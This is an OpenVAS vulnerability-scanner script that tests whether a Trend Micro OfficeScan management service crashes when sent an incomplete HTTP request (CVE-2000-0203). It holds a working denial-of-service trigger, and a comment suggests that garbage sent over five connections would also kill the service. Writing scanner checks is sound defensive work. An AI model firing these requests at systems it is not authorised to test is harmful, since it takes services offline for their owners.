###############################################################################
# OpenVAS Vulnerability Test
# $Id: tmosdos.nasl 6063 2017-05-03 09:03:05Z teissa $
#
# Trend Micro OfficeScan Denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CVE
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# http://online.securityfocus.com/bid/1013
#
# TBD:
# Sending garbage may also kill the service or make it eat 100% CPU
# Opening 5 connections while sending garbage will kill it

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11059");
  script_version("$Revision: 6063 $");
  script_tag(name:"last_modification", value:"$Date: 2017-05-03 11:03:05 +0200 (Wed, 03 May 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1013);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2000-0203");
  script_name("Trend Micro OfficeScan Denial of service");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2002 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 12345);
  script_exclude_keys("Settings/disable_cgi_scanning");

  tag_summary = "It was possible to kill the Trend Micro OfficeScan
  antivirus management service by sending an incomplete HTTP request.";

  tag_solution = "Upgrade your software";

  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");

# get or GET?
attack1 = string( "get /  \r\n" );
attack2 = string( "GET /  \r\n" );

port = get_http_port( default:12345 );

if( http_is_dead( port:port ) ) exit( 0 );

res = http_send_recv( port:port, data:attack1 );

if( http_is_dead( port:port ) ) {
  security_message( port:port );
  exit( 0 );
}

res = http_send_recv( port:port, data:attack2 );

if( http_is_dead( port:port ) ) {
  security_message( port:port );
  exit( 0 );
}

exit( 99 );
